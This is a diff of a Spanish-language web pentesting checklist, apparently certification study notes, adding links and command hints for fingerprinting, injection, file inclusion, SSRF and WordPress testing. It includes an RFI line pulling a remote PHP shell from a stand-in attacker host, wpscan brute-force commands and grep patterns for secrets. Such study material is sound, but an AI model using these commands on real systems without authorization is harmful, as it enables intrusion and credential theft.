@@ -1,5 +1,6 @@
 ---
 aliases:
+  - Checklists - CWES
 tags:
   - cert/cwes
   - asset/web-app
@@ -17,18 +18,22 @@ kind: CheatSheet
 linked:
   - "[[CWES]]"
 ---
-# CWES - Checklists
+# CWES - Checklist
 
 ---
 
 https://github.com/Jackie0x17/CBBH-Checklist
 ## Footprinting & Fingerprinting
 
+> [!tip] Técnica → [[Web Enumeración]]
+
 ### Fingerprinting del Servidor Web y Tecnologías
 
+> [!tip] Técnica → [[Web Fingerprinting]]
+
 - **Identificación del Servidor Web:**
-    - [ ] ¿Qué tipo de Web Server es? (Apache, Nginx, IIS, etc.)
-    - [ ] ¿Versión del servidor web?
+    - [ ] ¿Qué tipo de Web Server es? (Apache, Nginx, IIS, etc.) → header `Server` con `curl -I http://<IP>`
+    - [ ] ¿Versión del servidor web? → `Server` header / `whatweb http://<IP>` / `nmap -sV -p80,443 <IP>`
 - **Identificación Activa de Infraestructura:**
     - [ ] **Cabeceras HTTP:**
         - [ ] `curl -I http://<IP>` o `curl -s -v http://<IP>`
@@ -56,26 +61,28 @@ https://github.com/Jackie0x17/CBBH-Checklist
     - [ ] **Aquatone:**
         - [ ] `cat subdominios.txt | aquatone -ports large` (para escaneo de puertos y screenshots de subdominios).
 - **Identificación de CMS y Frameworks:**
-    - [ ] ¿Utiliza un CMS? (WordPress, Joomla, Drupal, etc.)
+    - [ ] ¿Utiliza un CMS? (WordPress, Joomla, Drupal, etc.) → `whatweb` + probe `/wp-admin`,`/administrator`,`/CHANGELOG.txt` · [[Web Technology Enumeration]]
         - [ ] Identificar rutas específicas del CMS (ej. `/wp-admin`, `/administrator`).
-    - [ ] ¿Tecnología de Backend? (PHP, Java, ASPX, Node.js, Python, Ruby)
-    - [ ] ¿Framework específico? (Laravel, Express, Django, Rails, Spring, etc.)
+    - [ ] ¿Tecnología de Backend? (PHP, Java, ASPX, Node.js, Python, Ruby) → header `X-Powered-By` / extensión de archivos / cookie de sesión
+    - [ ] ¿Framework específico? (Laravel, Express, Django, Rails, Spring, etc.) → `whatweb` / páginas de error default / headers
 - **Identificación de APIs:**
-    - [ ] ¿Hay APIs expuestas? (REST, SOAP, GraphQL)
+    - [ ] ¿Hay APIs expuestas? (REST, SOAP, GraphQL) → probe `/api`,`/graphql`,`/v1`,`?wsdl` · [[API Fuzzing]]
     - [ ] ¿Parámetros de consulta en URLs que sugieran APIs? (`/api/`, `?id=`)
     - [ ] (Para más detalles, ver sección específica de APIs).
 - **Proxy AJP:**
     - [ ] Realizar escaneo `nmap -sV -p 8009 <IP>` para el puerto `8009/tcp`. Si está abierto, revisar sección _AJP Proxy_ en **Ataques del Lado del Servidor**.
 - **Pila Tecnológica de Backend:**
-    - [ ] ¿LAMP, WAMP, MAMP, XAMPP, MEAN, etc.?
+    - [ ] ¿LAMP, WAMP, MAMP, XAMPP, MEAN, etc.? → se infiere de Server + lenguaje + DB detectados
 - **Base de Datos:**
-    - [ ] ¿Se puede inferir la base de datos utilizada? (MySQL, PostgreSQL, MongoDB, SQL Server, Oracle)
-    - [ ] ¿Relacional o NoSQL?
+    - [ ] ¿Se puede inferir la base de datos utilizada? (MySQL, PostgreSQL, MongoDB, SQL Server, Oracle) → errores SQL / puerto (`nmap -sV`) / `X-Powered-By`
+    - [ ] ¿Relacional o NoSQL? → según motor detectado (SQL = relacional; Mongo/Redis = NoSQL)
 - **Certificado TLS/SSL:**
     - [ ] Revisar certificado (emisor, validez, algoritmos).
     - [ ] Revisar versión de TLS y configuraciones (ciphersuites débiles). Herramientas como `testssl.sh` o Qualys SSL Labs.
 
 ### Búsqueda y Análisis de Metarchivos y Contenido Estándar
+
+> [!tip] Técnica → [[robots.txt]] · [[Well-Known URIs]]
 
 - [ ] **`robots.txt`:**
     - [ ] Revisar `http://<dominio>/robots.txt`.
@@ -99,14 +106,16 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ### Revisión Inicial del Contenido Web
 
-- **Análisis del Código Fuente (HTML, CSS, JS):**
+> [!tip] Técnica → [[Source Code Review]]
+
+- **Análisis del Código Fuente (HTML, CSS, JS):** → `Ctrl+U` / DevTools (F12) / `curl -s <URL>`
     - [ ] **Tags HTML Clave:**
         - [ ] `<head>`: Metadatos, enlaces a scripts/CSS.
         - [ ] `<body>`: Contenido visible.
         - [ ] `<style>`: CSS incrustado.
         - [ ] `<script>`: JavaScript incrustado o enlaces a archivos `.js`.
     - [ ] **Exposición de Datos Sensibles en el Código Fuente:**
-        - [ ] Comentarios HTML/JS: ¿Credenciales, hashes, claves API, rutas internas, información de depuración?
+        - [ ] Comentarios HTML/JS: ¿Credenciales, hashes, claves API, rutas internas, información de depuración? → `grep -rEi 'password|api[_-]?key|token|secret'` sobre el source/JS
         - [ ] Enlaces expuestos (URLs ocultas o de prueba).
         - [ ] Directorios o archivos referenciados.
         - [ ] Información de usuarios.
@@ -143,6 +152,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
     - [ ] ¿Se pueden modificar respuestas para eludir restricciones del lado del cliente? (Ej. habilitar botones deshabilitados).
 
 ### Recopilación de Información sobre Dominios y Subdominios
+
+> [!tip] Técnica → [[Subdomains Passive Enumeration]] · [[Directory Fuzzing]] · [[Subdomain & VHost Fuzzing]] · [[Parameter Fuzzing]]
 
 - [ ] **WHOIS:**
     - [ ] `whois <dominio>`: Información de registro, contactos, servidores DNS.
@@ -189,6 +200,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ## Análisis de Peticiones y Respuestas Web
 
+> [!tip] Técnica → [[HTTP - Headers]] · [[HTTP - Cookies y Sesiones]]
+
 - [ ] **Revisión General de Peticiones/Respuestas:**
     - [ ] Usar DevTools del navegador y Burp Suite/OWASP ZAP para inspeccionar todo el tráfico.
 - [ ] **Cabeceras HTTP y Cookies:**
@@ -232,6 +245,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ## Gestión de Identidad
 
+> [!tip] Técnica → [[Authentication & Authorization Bypass]]
+
 - [ ] **HTTP Verb Tempering (Manipulación de Verbos HTTP):**
     - [ ] Probar si cambiar métodos HTTP (ej. de GET a POST, o usar PUT, DELETE, HEAD, PATCH en endpoints no diseñados para ellos) elude controles de acceso.
     - [ ] ¿Se puede acceder a funcionalidades de administrador usando métodos no estándar en endpoints de usuario?
@@ -254,6 +269,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
         - [ ] **IDOR en APIs:** Aplicar los mismos principios a endpoints de API.
 
 ## Pruebas de Autenticación
+
+> [!tip] Técnica → [[Authentication & Authorization Bypass]] · [[HTTP Brute Forcing]] · [[Default credentials]]
 
 - [ ] **Canal No Cifrado (HTTP):**
     - [ ] ¿Página de login accesible vía HTTP?
@@ -308,6 +325,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ## Pruebas de Gestión de Sesiones
 
+> [!tip] Técnica → [[Session Hijacking]] · [[JWT Attacks]] · [[Cross-Site Request Forgery (CSRF)]]
+
 - [ ] **Seguridad de Cookies de Sesión (ya cubierto parcialmente en "Peticiones Web"):**
     - [ ] Atributos: `HttpOnly`, `Secure`, `SameSite` (`Strict`/`Lax`), `Path`, `Domain`, `Expires`.
     - [ ] Prefijos de cookie: `__Host-`, `__Secure-`.
@@ -348,6 +367,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 ## Input Validation Testing
 
 ### Cross-Site Scripting
+
+> [!tip] Técnica → [[Cross-Site Scripting (XSS)]]
 
 - [ ] **Descubrimiento Manual y Automatizado:**
     - [ ] Identificar dónde la entrada del usuario se refleja en la respuesta.
@@ -390,11 +411,15 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ### HTML Injection
 
+> [!tip] Técnica → [[HTML Injection]]
+
 - [ ] Comprobar si en campos sin validación por parte del usuario funcionan tags HTML simples (ej. `<h1>Test</h1>`, `<b>Test</b>`).
 - [ ] ¿Se puede inyectar un formulario falso para phising?
 - [ ] Diferenciar de XSS: el objetivo es inyectar HTML, no necesariamente JavaScript (aunque a menudo van juntos).
 
 ### SQL Injection 
+
+> [!tip] Técnica → [[SQL Injection (SQLi)]]
 
 - [ ] **Detección:**
     - [ ] **Manual:**
@@ -435,6 +460,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ### Command Injection
 
+> [!tip] Técnica → [[OS Command Injection]]
+
 - [ ] **Detección:**
     - [ ] Identificar parámetros que puedan ser usados en comandos del sistema (ej. filenames, hosts para ping, etc.).
     - [ ] Inyectar metacaracteres de shell y comandos simples:
@@ -459,6 +486,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 - [ ] **Inyección Ciega de Comandos:** Usar comandos que generen retardos (`sleep`, `ping`) o exfiltren datos por canales OOB (DNS, HTTP).
 
 ## File Upload
+
+> [!tip] Técnica → [[File Upload - Vulnerabilidades]]
 
 - [ ] **Identificar Funcionalidad de Carga:**
     - [ ] ¿Qué tipos de archivo se permiten (extensiones, Content-Type)?
@@ -492,7 +521,11 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ## LFI/RFI
 
+> [!tip] Técnica → [[File Inclusion]] · [[Remote File Inclusion (RFI)]]
+
 ### Local File Inclusion (LFI)
+
+> [!tip] Técnica → [[File Inclusion]]
 
 - [ ] **Identificar Parámetros Vulnerables:** Buscar parámetros como `?page=`, `?file=`, `?include=`, `?path=`, `?document=`.
 - [ ] **Path Traversal:**
@@ -536,6 +569,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ### Remote File Inclusion (RFI)
 
+> [!tip] Técnica → [[Remote File Inclusion (RFI)]]
+
 - [ ] **Verificar si es posible (requiere `allow_url_fopen=on` y `allow_url_include=on` en PHP).**
 - [ ] **Explotación:**
     - [ ] Incluir un shell remoto: `?page=http://atacante.com/shell.txt` (donde shell.txt contiene código PHP).
@@ -547,6 +582,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 ## Ataques del Lado del Servidor
 
 ### Server-Side Request Forgery (SSRF)
+
+> [!tip] Técnica → [[Server-Side Request Forgery (SSRF)]]
 
 - [ ] **Descubrimiento e Identificación:**
     - [ ] Buscar funcionalidades que tomen URLs como entrada (webhooks, importadores de URL, conversores PDF, proxies internos).
@@ -579,6 +616,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ### Server-Side Includes (SSI) Injection
 
+> [!tip] Técnica → [[Server-Side Includes (SSI) Injection]]
+
 - [ ] **Identificación:**
     - [ ] Buscar páginas con extensiones `.shtml`, `.shtm`, `.stm`.
     - [ ] Inyectar directivas SSI en campos de entrada que se reflejen en la página:
@@ -593,6 +632,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ### Edge Side Includes (ESI) Injection
 
+> [!tip] Técnica → [[Server-Side Includes (SSI) Injection]]
+
 - [ ] **Identificación:**
     - [ ] Buscar cabeceras como `Surrogate-Control`, `X-ESI-Enabled`, `Edge-Control`.
     - [ ] Inyectar tags ESI en puntos de entrada reflejados:
@@ -606,6 +647,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
     - [ ] DoS.
 
 ### Server-Side Template Injection (SSTI)
+
+> [!tip] Técnica → [[Server-Side Template Injection (SSTI)]]
 
 - [ ] **Identificación:**
     - [ ] Buscar parámetros que se reflejen en la página, especialmente si usan plantillas (ej. personalización de emails, mensajes de error).
@@ -634,6 +677,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 - [ ] **Herramientas Automatizadas:** Tplmap (`tplmap -u <URL_con_param_vulnerable>`).
 
 ### XML External Entity (XXE) Injection
+
+> [!tip] Técnica → [[XML External Entity (XXE)]]
 
 - [ ] **Identificación:**
     - [ ] Buscar funcionalidades que procesen XML (uploads de XML/SOAP, APIs que acepten XML, RSS feeds).
@@ -666,6 +711,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 - [ ] **XXE en Content-Types comunes:** `application/xml`, `text/xml`, a veces en `application/json` si el parser lo maneja como XML.
 
 ### XSLT Injection
+
+> [!tip] Técnica → [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]
 
 - [ ] **Identificación:**
     - [ ] Funcionalidades que transformen XML usando XSLT (ej. generación de reportes, conversión de XML a HTML/PDF).
@@ -701,7 +748,11 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ## Pruebas de API y Servicios Web
 
+> [!tip] Técnica → [[API Security]] · [[API Fuzzing]]
+
 ### Descubrimiento e Identificación de APIs
+
+> [!tip] Técnica → [[API Fuzzing]]
 
 - [ ] **Buscar Endpoints de API:**
     - [ ] Crawling, análisis de JS, `robots.txt`, `sitemap.xml`.
@@ -750,6 +801,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ### Asignación Masiva (Mass Assignment)
 
+> [!tip] Técnica → [[Mass Assignment]]
+
 - [ ] ¿Se pueden modificar campos de objetos internos que no deberían ser accesibles (ej. rol de usuario) enviándolos en la petición JSON/XML? 
 
 ### Mala Configuración de Seguridad
@@ -769,6 +822,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 - [ ] Si la API consume otras APIs o URLs, ¿es vulnerable a SSRF?
 
 ### Ataques Específicos de API
+
+> [!tip] Técnica → [[GraphQL Injection]]
 
 - [ ] **Information Disclosure (con posible SQLi):**
     - [ ] Fuzzing de parámetros: `ffuf -w <params_wordlist> -u 'http://<API_ENDPOINT>/?FUZZ=test_value'`
@@ -805,6 +860,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 
 ## Wordpres
 
+> [!tip] Técnica → [[WordPress Enumeration]] · [[WordPress Exploitation]]
+
 ### Estructura y Archivos Clave de WordPress
 
 - [ ] **Archivos Raíz:** `index.php`, `license.txt` (versión), `readme.html` (versión), `wp-config.php` (crítico), `wp-admin/` (login), `wp-login.php`, `xmlrpc.php`.
@@ -817,6 +874,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
 - [ ] **Roles de Usuario:** Entender los roles (Administrator, Editor, Author, Contributor, Subscriber).
 
 ### Enumeración de WordPress
+
+> [!tip] Técnica → [[WordPress Enumeration]]
 
 - [ ] **Versión de WordPress Core:**
     - [ ] Código fuente: `meta name="generator"` tag.
@@ -839,6 +898,8 @@ https://github.com/Jackie0x17/CBBH-Checklist
     - [ ] `wpscan --url <URL> --enumerate x` (si xmlrpc está habilitado).
 
 ### Ataques a WordPress
+
+> [!tip] Técnica → [[WordPress Exploitation]]
 
 - [ ] **Ataques de Login / Fuerza Bruta:**
     - [ ] Usar `wpscan --url <URL> --passwords <pass_list> --usernames <user_list_o_usuario>`.
